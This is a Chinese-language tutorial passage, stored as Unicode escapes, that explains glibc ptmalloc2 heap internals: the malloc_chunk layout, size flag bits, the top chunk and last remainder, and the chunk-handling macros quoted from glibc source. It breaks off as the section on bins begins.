\u4efb\u4f55\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u662f\u4ee5 chunk \u4e3a\u5355\u4f4d\u8fdb\u884c\u5806\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u800c\u8fd9\u5c31\u9700\u8981\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u6765\u6807\u5fd7\u5404\u4e2a\u5757\u7684\u8fb9\u754c\uff0c\u4ee5\u53ca\u533a\u5206\u5df2\u5206\u914d\u5757\u548c\u7a7a\u95f2\u5757\u3002\u5927\u591a\u6570\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u5c06\u8fd9\u4e9b\u8fb9\u754c\u4fe1\u606f\u4f5c\u4e3a chunk \u7684\u4e00\u90e8\u5206\u5d4c\u5165\u5230 chunk \u5185\u90e8\u3002 \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\uff08malloc_chunk\uff09\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002 malloc_chunk (allocated chunk) malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b: /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740 chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00 chunk \u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f (\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2a chunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0 \u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684 P \u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2 chunk \u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002 chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3a user data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411 user data \u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524d chunk \u4f7f\u7528\u3002 \u8fd9\u5c31\u662f chunk \u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 \u5df2\u7ecf\u88ab\u5206\u914d\u4f7f\u7528\u7684 chunk \u7ed3\u6784\u5982\u4e0b\u4e24\u4e2a\u56fe\uff1a\uff08\u56fe\u4e00\u56fe\u4e8c size \u4f4d A \u4e0e N \u76f8\u540c\u542b\u4e49\u53ea\u662f\u8868\u793a\u4e0d\u540c\uff09 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ free_chunk \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684 size \u5b57\u6bb5\u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u884c size \u4f4d\uff09 \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u5012\u6570\u7b2c\u4e8c\u884c nextchunk \u7684 prevsize \u4f4d\uff09 \u4e00\u822c\u60c5\u51b5\u4e0b \uff08fastbin\u4e2d\u5b58\u5728\u7279\u4f8b\uff09\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */ top chunk glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684 top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002 top chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin \uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684 bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c top chunk \u5927\u5c0f\u4e0d\u5c0f\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff0c\u5c31\u5c06\u8be5 top chunk \u5206\u4f5c\u4e24\u90e8\u5206\uff1a\u7528\u6237\u8bf7\u6c42\u7684 chunk \u548c \u5269\u4f59\u7684\u90e8\u5206\uff08\u6210\u4e3a\u65b0\u7684 top chunk \uff09\u3002\u5426\u5219\uff0c\u5c31\u5bf9 heap \u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728 main arena \u4e2d\u901a\u8fc7 sbrk \u6269\u5c55 heap \uff0c\u800c\u5728 thread arena \u4e2d\u901a\u8fc7 mmap \u5206\u914d\u65b0\u7684 heap \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a 1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684 chunk \u5c31\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002 last remainder \u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \uff08bin\u4e2d\u7684chunk\uff09\u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin \u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3a last remainder\u3002 chunk \u76f8\u5173\u5b8f \u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem \u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e chunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914d MINSIZE \u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6 chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2a chunk \u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524d chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6e chunk \u7684 size \u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684 chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904 chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE)) bin \u4ecb\u7ecd \u6982\u8ff0 \u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684 chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684 chunk 